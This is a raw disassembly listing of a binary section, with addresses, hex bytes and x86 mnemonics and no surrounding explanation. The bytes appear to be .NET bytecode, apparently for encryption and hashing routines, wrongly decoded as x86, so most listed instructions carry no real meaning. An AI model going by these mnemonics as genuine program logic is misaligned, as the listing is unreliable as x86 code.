  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 b0             	add    %dh,-0x50(%edx)
  4042d8:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 de             	add    %dh,-0x22(%edx)
  40436b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	34 27                	xor    $0x27,%al
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 3a    	or     %dl,0x3a72060d(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 4a    	or     %dl,0x4a72060d(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
